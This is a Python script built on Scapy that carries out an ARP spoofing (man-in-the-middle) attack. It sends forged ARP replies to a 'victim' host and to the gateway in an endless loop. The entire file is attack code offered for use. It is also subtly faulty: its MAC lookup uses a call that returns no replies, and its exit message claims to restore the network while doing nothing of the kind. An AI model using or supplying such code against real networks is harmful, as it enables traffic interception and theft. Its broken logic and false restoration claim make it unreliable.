from scapy.all import ARP, Ether, send
import time

# Set the target and gateway IP addresses
target_ip = "192.168.1.100"  # Change this to your victim's IP
gateway_ip = "192.168.1.1"   # Change this to your network's gateway IP

# Attacker's MAC address will be used automatically
def get_mac(ip):
    """ Get the MAC address of a given IP using ARP request """
    ans, _ = send(ARP(op=1, pdst=ip), verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, gateway_ip):
    """ Send fake ARP replies to the target, poisoning its ARP cache """
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("Could not get MAC addresses. Exiting...")
        return

    print(f"Starting ARP Spoofing on {target_ip}...")
    
    while True:
        # Tell the target that the attacker's MAC is the gateway
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=False)

        # Tell the gateway that the attacker's MAC is the target
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)

        time.sleep(2)  # Send packets every 2 seconds

try:
    spoof(target_ip, gateway_ip)
except KeyboardInterrupt:
    print("\nStopping attack and restoring network...")
